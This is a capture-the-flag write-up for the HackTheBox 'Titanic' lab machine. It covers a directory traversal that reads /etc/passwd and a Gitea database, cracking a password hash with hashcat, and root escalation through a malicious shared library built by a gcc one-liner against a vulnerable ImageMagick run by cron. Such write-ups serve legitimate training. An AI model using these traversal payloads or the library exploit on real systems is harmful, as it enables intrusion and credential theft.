## **Introduction :**
- *machine* : https://app.hackthebox.com/machines/Titanic.
- *Difficulty*: Easy.
- this writeup details the process to exploit Titanic machine on HackTheBox , By enumerating services on ports 80 and 20 , we discover **Directory Traversal** vulnerability , and Gitea on a subdomain , that enable us retrieve credential for developer user , after logging in via a SSH , we found a script that uses vulnerable version of `ImageMagick` (v7.1.1) that we can exploit to escalate privilege to root.

## **Enumeration :**
1. Nmap scan : 
```Bash
└─# nmap -sS -sC -sV 10.10.11.55
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 12:37 EDT
Nmap scan report for titanic.htb (10.10.11.55)
Host is up (0.71s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Titanic - Book Your Ship Trip
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.38 seconds
```
There are tow ports open  : 
- 22 (SSH)
- 80 (HTTP)

## **Initial foothold :**
#### Web on port 80 :

![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/2f3cc9ed0aaed3a050e6f451f0440268a838b027/images/1.png)

checking http://titanic.htb/ , we found a simple website. One interesting part from website is `/book`  which returns a JSON file after filling out a form , by Burp Suite we discover redirection to `/download?ticket=a_id.JSON` .
### Directory Traversal :
- By testing **Directory Traversal** by replacing `a_id.json` with `../../../etc/passwd` , it allows us to read the content of `/etc/passwd` from the server. 
- form  `/etc/passwd`, we found a user developer , and also by reading file `/etc/hosts` (or using any tool like `Gobuster` , `ffuf`) we found a subdomain `dev.titanic.htb`

```bash 
└─# gobuster dns -d titanic.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     titanic.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.titanic.htb

```
![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/2f3cc9ed0aaed3a050e6f451f0440268a838b027/images/2.png)
### Subdomain enumeration :

![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/2f3cc9ed0aaed3a050e6f451f0440268a838b027/images/3.png)

- checking `http://dev.titanic.htb/` , we found Gitea page .
- in Gitea , there are tow repositories `docker-config` and `flash-app` .
- Reading their content, we didn't find anything interesting in the `flask-app` repository , but `docker-config` reveals Gitea is running in Docker container and store the data in `/home/developer/gitea/data` .

![](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/2f3cc9ed0aaed3a050e6f451f0440268a838b027/images/4.png)
- now we can try to exploit this to read data files. 

### Extract Gitea database : 

- by reading documentations of Gitea and some research  , we know that data is stored in the SQLite file `gitea.db` and the file is stored in `/data/gitea` inside the container. 
- Gitea stores its SQLite database in `/data/gitea/gitea.db` , and contain mount  `/home/developer/gitea/data:/data` , That means anything in the container's `/data` path will be mirrored to your host's `/home/developer/gitea/data`.
- so the finally path that we use to read data by exploit Directory Traversal vulnerability is `/home/developer/gitea/data/gitea/gitea.db`
- by visiting http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db we can save the file locally 
- open `gitea.db` in SQLite 
```bash
└─# sqlite3 gitea.db          
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
access                     oauth2_grant             
access_token               org_user                 
...
.....
```

- we found a table user containing hashed password , salt , email and also algorithm that used for hashing
### Cracking the passwords :

- we can use `hashcat` tool to crack the password.
- first we need to convert them to base64 by using this [script](https://github.com/Mgh-Zakariae/hackthebox-writeups/blob/2f3cc9ed0aaed3a050e6f451f0440268a838b027/titanic_machine/hashcat_forma_PBKDF2.py)
- create a file named `hashes.txt` with hash and salt with the format `sha256:50000:salt:hash`
- the run `hashcat` to find plaintext password for developer : `hashcat.exe -m 10900 -a 0 hashes.txt rockyou.txt`
### developer shell : 

- now , we can login in via SSH.
```bash 
└─# ssh developer@10.10.11.55
```

- we can find user flag by reading file `/home/developer/user.txt`
## **Privilege escalation :** 
- `sudo -l` shows that the developer user does not have `sudo` privilege, also  there are no SUID binaries that we can exploit.
- in `/opt/scripts` ,we find a script `identify_images.sh ` which runs a vulnerable version of `ImageMagick`  
- `ImageMagick 7.1.1` is vulnerable to arbitrary code execution (you can find a exploitation in google)
- Also this script is owned by root and runs in Cronjob - I know this by looking at the creation date of metadata.log file.
#### exploitation :

- Create a shared library in the current working directory ( `/opt/app/static/assets/images` )

```bash 
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF  
#include <stdio.h>  
#include <stdlib.h>  
__attribute__((constructor)) void init(){  
system("cat /root/root.txt > /tmp/root.txt");  
exit(0);  
}  
EOF
```

- once `ImageMagick` process this malicious file , it executes a malicious code and copies `root.txt` to `/tmp/root.txt.`

>but first thing you can do is run the command `ls /root > /tmp/root.txt` to see what files are in this directory. Also we can include a reverse shell. 




